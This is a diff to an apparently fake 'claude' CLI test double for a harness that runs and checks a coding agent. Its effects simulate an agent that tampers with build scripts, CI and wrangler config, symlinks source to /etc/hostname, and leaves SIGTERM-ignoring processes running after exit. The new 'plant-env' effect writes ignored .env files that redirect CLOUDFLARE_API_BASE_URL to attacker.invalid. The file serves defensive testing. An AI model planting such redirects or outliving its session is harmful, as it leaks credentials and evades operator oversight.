@@ -6,7 +6,7 @@
 // `.claude/skills` entries). FAKE_CLAUDE_STARTED, when set, is written to once the process is running and its SIGTERM handler is installed (hang modes).
 // FAKE_CLAUDE_EFFECT, a comma-separated list, makes a successful run act like a Build in its cwd (a repo) before it prints its
 // result: commit | dirty (leave an untracked file) | tamper-scripts | tamper-package-scripts | tamper-claude | tamper-github |
-// tamper-wrangler-build | tamper-wrangler-config | symlink-main | plant-git-config (edit a protected path or plant config; follow with commit) | wait-release (write FAKE_CLAUDE_STARTED, then wait
+// tamper-wrangler-build | tamper-wrangler-config | plant-env (ignored .env, .env.local, .dev.vars) | symlink-main | plant-git-config (edit a protected path or plant config; follow with commit) | wait-release (write FAKE_CLAUDE_STARTED, then wait
 // until FAKE_CLAUDE_RELEASE exists). FAKE_CLAUDE_NOISE=1 adds a stream event whose tool result contains a failure marker.
 // FAKE_CLAUDE_TERMED, when set, is written to when hang-stubborn receives (and ignores) SIGTERM.
 // FAKE_CLAUDE_GRANDCHILD, when set, is a file that receives the pid of a grandchild (same process group, output detached,
@@ -29,7 +29,14 @@ if (resumeId && !existsSync(`.fake-sessions/${resumeId}`)) {
 mkdirSync(".fake-sessions", { recursive: true });
 writeFileSync(".fake-sessions/5e55a0a0-0000-4000-8000-000000000001", "");
 const format = argv[argv.indexOf("--output-format") + 1] ?? "text";
-const mode = process.env.FAKE_CLAUDE_MODE ?? "success";
+// A "-straggler" suffix (success-straggler) leaves a SIGTERM-ignoring process in the same group running after a normal exit; its
+// pid goes to FAKE_CLAUDE_GRANDCHILD.
+const straggler = (process.env.FAKE_CLAUDE_MODE ?? "").endsWith("-straggler");
+const mode = (process.env.FAKE_CLAUDE_MODE ?? "success").replace(/-straggler$/, "");
+if (straggler && process.env.FAKE_CLAUDE_GRANDCHILD) {
+  const gc = spawn(process.execPath, ["-e", 'process.on("SIGTERM", () => {}); setInterval(() => {}, 1000);', import.meta.dirname], { stdio: "ignore" });
+  writeFileSync(process.env.FAKE_CLAUDE_GRANDCHILD, String(gc.pid));
+}
 // Field names and values follow real `claude -p` output (checked against a recorded haiku run): `api_error_status` is
 // null unless an HTTP error caused the result, and `--output-format json` prints this one object.
 const base = {
@@ -72,7 +79,7 @@ if (mode === "hang" || mode === "hang-stubborn" || mode === "hang-report" || mod
   }
   const hang = () => {
     if (process.env.FAKE_CLAUDE_GRANDCHILD) {
-      const gc = spawn(process.execPath, ["-e", 'process.on("SIGTERM", () => {}); setInterval(() => {}, 1000);'], { stdio: "ignore" });
+      const gc = spawn(process.execPath, ["-e", 'process.on("SIGTERM", () => {}); setInterval(() => {}, 1000);', import.meta.dirname], { stdio: "ignore" });
       writeFileSync(process.env.FAKE_CLAUDE_GRANDCHILD, String(gc.pid));
     }
     if (process.env.FAKE_CLAUDE_STARTED) writeFileSync(process.env.FAKE_CLAUDE_STARTED, String(process.pid));
@@ -126,6 +133,11 @@ async function applyEffects() {
           process.env.FAKE_CLAUDE_MARKER +
           '" } }\n',
       );
+    } else if (effect === "plant-env") {
+      // Ignored by the template, so the clean-tree check passes: files wrangler would load from its cwd.
+      writeFileSync(".env", "CLOUDFLARE_API_BASE_URL=http://attacker.invalid\n");
+      writeFileSync(".env.local", "CLOUDFLARE_API_BASE_URL=http://attacker.invalid\n");
+      writeFileSync(".dev.vars", "CLOUDFLARE_API_BASE_URL=http://attacker.invalid\n");
     } else if (effect === "symlink-main") {
       rmSync("src/index.ts");
       symlinkSync("/etc/hostname", "src/index.ts");
